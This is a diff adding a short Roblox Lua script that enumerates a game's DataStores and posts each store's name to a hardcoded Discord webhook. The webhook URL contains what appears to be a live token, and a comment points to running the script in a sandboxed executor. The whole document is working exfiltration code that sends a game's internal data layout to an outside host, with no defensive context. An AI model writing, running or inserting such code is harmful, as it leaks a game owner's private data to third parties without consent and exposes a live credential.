@@ -1,0 +1,16 @@
+-- No LuaU Support With VLua Sandbox
+
+local DataStore = game:GetService(`DataStoreService`)
+local HTTP = game:GetService(`HttpService`)
+
+local Pages = DataStore:ListDataStoresAsync()
+
+while true do
+	for _, C in next, Pages:GetCurrentPage() do
+		HTTP:PostAsync(`https://discord.com/api/webhooks/1176904084465393664/RMAhbC5AU7ORLjtotOhP5uiHPntnseTdMS7a83iyNyw-5CjT2HN0LjhcXUAn-2h0RXic`, HTTP:JSONEncode({
+			['content']=C.DataStoreName
+		}))
+	end
+	if Pages.IsFinished then break end 
+	Pages:AdvanceToNextPageAsync()
+end
